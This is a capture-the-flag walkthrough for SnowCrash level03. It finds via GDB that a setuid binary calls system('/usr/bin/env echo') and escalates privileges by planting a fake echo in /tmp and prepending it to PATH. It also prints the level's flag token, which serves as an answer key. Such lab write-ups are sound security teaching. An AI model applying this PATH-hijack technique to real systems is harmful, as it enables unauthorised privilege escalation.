# level03

- We login as user level03.
```
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

```
level03@SnowCrash:~$ ./level03
Exploit me
```


- A binary has been left for us, it belongs to user flag03 and group level03. Additionally, [the setuid and setgid permission bits](https://en.wikipedia.org/wiki/Setuid) are set.
Thus, this binary is executed with the privileges of user flag03 and group level03.
Let's take a closer look at this binary using [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
```
(gdb) info functions
All defined functions:

File /home/user/level03/level03.c:
int main(int, char **, char **);

Non-debugging symbols:
0x08048340  _init
...
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     and    $0xfffffff0,%esp
   0x080484aa <+6>:     sub    $0x20,%esp
   0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:    mov    %eax,0x18(%esp)
   0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:    mov    %eax,0x1c(%esp)
   0x080484bf <+27>:    mov    0x18(%esp),%eax
   0x080484c3 <+31>:    mov    %eax,0x8(%esp)
   0x080484c7 <+35>:    mov    0x18(%esp),%eax
   0x080484cb <+39>:    mov    %eax,0x4(%esp)
   0x080484cf <+43>:    mov    0x18(%esp),%eax
   0x080484d3 <+47>:    mov    %eax,(%esp)
   0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:    mov    0x1c(%esp),%eax
   0x080484df <+59>:    mov    %eax,0x8(%esp)
   0x080484e3 <+63>:    mov    0x1c(%esp),%eax
   0x080484e7 <+67>:    mov    %eax,0x4(%esp)
   0x080484eb <+71>:    mov    0x1c(%esp),%eax
   0x080484ef <+75>:    mov    %eax,(%esp)
   0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
   0x08048503 <+95>:    leave
   0x08048504 <+96>:    ret
End of assembler dump.
```


- We can see that the program makes a call to `<system@plt>` right after moving the address `0x80485e0` on top of the stack.
Let's display the value contained at this address.
```
(gdb) x/s 0x80485e0
0x80485e0:       "/usr/bin/env echo Exploit me"
```


- So, the program calls `system("/usr/bin/env echo Exploit me")`.
In bash, `echo` is a built-in command, but with the preceding `/usr/bin/env`, the program will use the `PATH` environment variable to search for the echo binary.
```
level03@SnowCrash:~$ echo "getflag" > /tmp/echo
```

```
level03@SnowCrash:~$ chmod +x /tmp/echo
```

```
level03@SnowCrash:~$ export PATH=/tmp:$PATH
```

```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

```
level03@SnowCrash:~$ su level04
Password:qi0maab88jeaj46qoumi7maus
level04@SnowCrash:~$
```